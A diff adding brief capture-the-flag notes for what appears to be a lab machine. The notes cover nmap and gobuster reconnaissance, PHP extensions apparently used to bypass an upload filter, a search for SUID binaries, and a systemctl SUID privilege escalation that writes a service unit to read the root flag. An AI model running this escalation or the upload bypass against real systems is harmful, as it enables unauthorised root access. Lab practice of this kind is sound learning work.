@@ -1,0 +1,102 @@
+
+1) Recon
+
+nmap -v -sT -p- -T5 <IP>
+
+Nmap scan report for ip-10-10-132-232.eu-west-1.compute.internal (10.10.132.232)
+Host is up (0.00028s latency).
+Not shown: 65529 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3128/tcp open  squid-http
+3333/tcp open  dec-notes
+MAC Address: 02:3C:E0:E6:14:99 (Unknown)
+
+-O
+
+MAC Address: 02:3C:E0:E6:14:99 (Unknown)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3.13
+OS details: Linux 3.13
+Uptime guess: 0.001 days (since Sun Mar 10 02:16:17 2024)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=260 (Good luck!)
+IP ID Sequence Generation: All zeros
+
+----------------------
+
+2) Directory Enumeration
+
+gobuster dir -u http://10.10.132.232:3333 -w <word list location>
+
+
+
+
+Payload Options {Simple List}
+
+.php4
+.php5
+.pht
+.phtml
+.ini
+
+
+
+----
+
+
+$ find / -type f -name user.txt 2>/dev/null
+
+
+
+find / -perm -u=s -type f 2>/dev/null
+
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/squid/pinger
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/su
+/bin/ntfs-3g
+/bin/mount
+/bin/ping6
+/bin/umount
+/bin/systemctl
+/bin/ping
+/bin/fusermount
+/sbin/mount.cifs
+
+---------------
+
+sudo install -m =xs $(which systemctl) .
+
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
+
+
+then
+
+cat /tmp/output
+
